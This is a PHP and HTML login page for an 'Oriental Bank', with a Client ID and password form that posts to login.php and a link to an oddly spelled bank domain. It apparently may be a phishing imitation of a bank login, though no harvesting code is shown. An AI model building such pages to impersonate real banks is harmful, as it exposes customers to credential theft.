<?php
// session_start();
include('./login.php');
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Oriental Bank Client-login</title>
  <script src="https://kit.fontawesome.com/bc377a0067.js" crossorigin="anonymous"></script>
  <!-- Latest compiled and minified CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="./style.css">
  <link rel="stylesheet" href="./style2.css">
</head>

<body>

  <div class="container-fluid">

    <div class="bank3">
      <h1><a href="https://orientalonlmb.org/" rel="home"><span>Oriental Bank</span></a></h1>
      <p>Personal Banking, Business Banking</p>
    </div>
  </div>
  <div class="container">
    <div class="loginPopup">
      <div class="formPopup" id="popupForm">
        <form action="./login.php" method="post" class="formContainer">
          <h5 class="pass-word"><i class="fa-solid fa-user"></i> Client ID</h5>
          <input type="text" id="email" placeholder="Enter Client ID" name="email" required autocomplete="email">
          <h5 class="pass-word"><i class="fa-solid fa-key"></i> Password</h5>
          <input type="password" id="psw" placeholder="Enter Password" name="pwd" required>
          <input class="check-me" type="checkbox" id="checkBtn" name="checkBtn">
          <label class="remember-me" for="checkBtn">Remember me</label><br>
          <div class="btn">
            <div>
              <button type="submit" class="btn login">Log in</button><br>
            </div>
            <!-- <div>
          <button type="button" class="btn cancel" onclick="closeForm()">Close</button>
        </div> -->
          </div>
          <p class="enroll">Don't have account ? <a href="./signup.php">Enroll Now</a></p>
        </form>
      </div>
    </div>
  </div>

<!--   
  <section class="all-right">
    <div class="rights">
      <p>©2022 Orienal Bank. All Rights Reserved</p>
    </div>
  </section> -->

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>

</html>